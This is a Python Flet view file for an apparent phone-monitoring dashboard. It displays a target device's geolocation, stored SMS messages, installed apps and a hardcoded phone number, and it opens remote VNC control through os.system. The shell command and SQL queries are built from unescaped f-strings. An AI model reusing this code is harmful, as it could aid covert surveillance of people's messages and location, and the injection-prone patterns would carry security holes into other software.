import math
from views.libs.GetRouteFile import GetRouteImage
from views.libs.DefineCards import DefineCardsInfoDevice, DefineCardsAPPS_SMS_Device

from flet import (
    Page,
    Container,
    alignment,
    Column,
    Text, 
    FontWeight,
    Image,
    border_radius,
    icons,
    IconButton,
    CrossAxisAlignment,
    SweepGradient,
    ScrollMode,
    Icon,
    Row,
    MainAxisAlignment,
    ListView,
    TextButton
    
)

from os import system
from views.indexView import listaIDDevice, listIPDevice, listIPDevice1, listNameDevice
from views.libs.LocalitationDevice import IPinfo
from db.script import ReadTableDb
from json import loads, load
from jsonData.script import InsertUserInJson
from views.libs.GetRouteFile import GetRouteImage


def ConfigProfileUser(page: Page):

    def TitlePageInformationDevice():
        
        titulo = "INFORMACIÓN DE DISPOSITIVO"
        containerTitileInformationDevice = Container(
            alignment= alignment.center,
            
            content=
            Column(
                controls=[
                    
                    Text(
                        titulo, 
                        weight= FontWeight.BOLD,
                        size=16, 
                        font_family="Consolas",#USAMOS LA FUENTE CONSOLAS, (TEST)
                        italic=True#ACTIVAMOS LA LETRA ITALIC 
                    )
                    
                ]
            )

        )
        
        return (
            
            containerTitileInformationDevice
        
        )
        
    def RouteImage():
        ruta_archivo = "jsonData/config.json"

        with open(ruta_archivo, 'r') as archivo:
            datos_json = load(archivo)

        dataImage = datos_json[f"{listaIDDevice[0]}"]
        routeImage = dataImage['imagen_perfil']
        return routeImage

    def ProfileUser():
        
        routeImage = RouteImage()

        imageUser = Image(
            src=routeImage,#IMAGEN POR DEFECTO
            width=120,
            height=120, 
            border_radius= border_radius.all(15)
        )
        
        def changeImageUser(e):
            InsertUserInJson(nameUser=listNameDevice[0], id_user=listaIDDevice[0], nueva_imagen=GetRouteImage())
            imageUser.src = RouteImage()
            page.update()
            
        iconEditImageUser = IconButton(
            icon = icons.EDIT,
            tooltip="Editar Imágen",
            on_click=changeImageUser
            )  

        nameUser = Text(listNameDevice[0])#FALTA PONER EL NOMBRE RESPECTIVO SEGÚN DIGA LA BASE DE DATOS
        
        containerUserProfile = Container(
            
            width= 150,
            content= Column(
                horizontal_alignment= CrossAxisAlignment.CENTER,
                
                controls=[
                    imageUser,
                    iconEditImageUser,
                    nameUser
                ]
                
            )
        )
        
        return (
            
            containerUserProfile
        
        )
        
        
    def InfoDevice():
        IPDevice = listIPDevice[0]
        ipinfo = IPinfo(IPDevice)
        localitation = ipinfo.start()
        data_dict = loads(localitation)

        # Acceder a los valores del diccionario
        pais = data_dict["country"]
        ciudad = data_dict["city"]
        proveedorInternet = data_dict["isp"]
        Maps = data_dict["maps"]
        bandera = data_dict["flag"]
        
        readMessages =  ReadTableDb(
        "db/smsDevices.db",
        f"""
        SELECT * FROM sms_device_{listaIDDevice[0]}
        
        """    
        )
        
        readApps = ReadTableDb(
        "db/appsDevices.db",
        f"""
        SELECT * FROM apps_device_{listaIDDevice[0]}
        
        """    
        )
        
        
        gradient= SweepGradient( #DEGRADADO EN ESTRELLA
                center= alignment.center,
                start_angle=0.0,
                end_angle=math.pi * 2,
                colors=[
                    "0x8b0000",
                    "0xFF34A853",
                    "0x0F130C",
                    "0xFFEA4335",
                    "0x8b0000",
                ],
                stops=[0.0, 0.25, 0.5, 0.75, 1.0],
            )
        width, padding = 900, 10
        
        containerInfoExtraDevice = Container(
            
            content= Column(
                scroll= ScrollMode.ALWAYS,
                controls=[
                    
                    DefineCardsInfoDevice(
                        gradient,
                        width,
                        padding,
                        Icon(icons.PHONE_ANDROID),
                        "SIM CARD",
                        "Operador: Claro Colombia",
                        "Célular: 3149127812",
                        "Identificador: 8912112"
                    ),
        
                    DefineCardsInfoDevice(
                        gradient,
                        width,
                        padding,
                        Icon(icons.LOCATION_ON),
                        "UBICACIÓN",
                        f"País: {pais} {bandera}",
                        f"Ciudad: {ciudad}"
                        #f"Cod Postal: 1247412",
                        f"Coordenadas: {Maps}",
                        f"Proveedor de internet: {proveedorInternet}",
                    ),
        
        
                    DefineCardsAPPS_SMS_Device(
                        gradient,
                        width,
                        padding,
                        Icon(icons.APPS_SHARP),
                        "MENSAJES DE TEXTO",
                        "sms",
                        readMessages
                    ),
                    
                    
                    DefineCardsAPPS_SMS_Device(
                        gradient,
                        width,
                        padding,
                        Icon(icons.APPS_SHARP),
                        "APLICACIONES",
                        "apps",
                        readApps
                    ),
        
                    DefineCardsInfoDevice(
                        gradient,
                        width,
                        padding,
                        Icon(icons.ELECTRIC_BOLT_SHARP),
                        "GENERAL",
                        "Hora: 11:41am",
                        "Temperatúra Célular: 32ºC"
                    ),
                    
                ]
            )
        )
        
        return (
            
            containerInfoExtraDevice
        
        )
        
        
    def NavigateToVnc_Server(e):
        ipServer = listIPDevice1[0]
        print(ipServer)
        page.go("/index/ExtraInfoDevice/vnc_server")#NAVEGAR HACIA LA VISTA VNC_SERVER
        system(f"./bins/vncviewer -geometry 405x610+412+140 {ipServer}:5300")

        
        
    def ViewVNCServerProfile():
        
        imagePlayVNC = Image(
            src= "playVNC.jpeg",
            border_radius= border_radius.all(20),
            )
        
        containerNavigateToVNC_SERVER = Container(
            alignment= alignment.top_right,
            width= 170,
            height= 170,
            content= imagePlayVNC
        )
        
        buttonBackground = IconButton(
            content=containerNavigateToVNC_SERVER,
            on_click=NavigateToVnc_Server                
        )

        return (
            
            buttonBackground
        
        )
    
    def NavigateToIndex(e):
        page.go("/index")#NAVEGAMOS HACIA LA VISTA /INDEX
        
        
    def BackToPagePrevious():
        
        iconBackPage = IconButton(
                
            icon= icons.ARROW_BACK,
            tooltip= "Volver a la página anterior",
            on_click= NavigateToIndex
        
        )
        
        containerBackPage = Container(
            
            alignment= alignment.bottom_left,
            content= iconBackPage
        
        )
        
        return (
            containerBackPage
        )
    
    
    cardsInfoDevice = InfoDevice()
    
    aggScrollToCardsInfoDevice = ListView(expand=1, spacing=10, padding=20, auto_scroll=False)
    aggScrollToCardsInfoDevice.controls.append(cardsInfoDevice)
    
    ElementsRow = Row(
            alignment= MainAxisAlignment.SPACE_BETWEEN,
            controls=[
                ProfileUser(),
                aggScrollToCardsInfoDevice,
                ViewVNCServerProfile()
            ]
        )
    
    aggScrollToElementsRow = ListView(expand=1, spacing=10, padding=20, auto_scroll=False)
    aggScrollToElementsRow.controls.append(ElementsRow)
    
    
    viewExtraInfoDevice = [
        TitlePageInformationDevice(),
        aggScrollToElementsRow,   
        BackToPagePrevious()
        ]
    
    return (
        
        viewExtraInfoDevice
    
    )
    
    
    
    
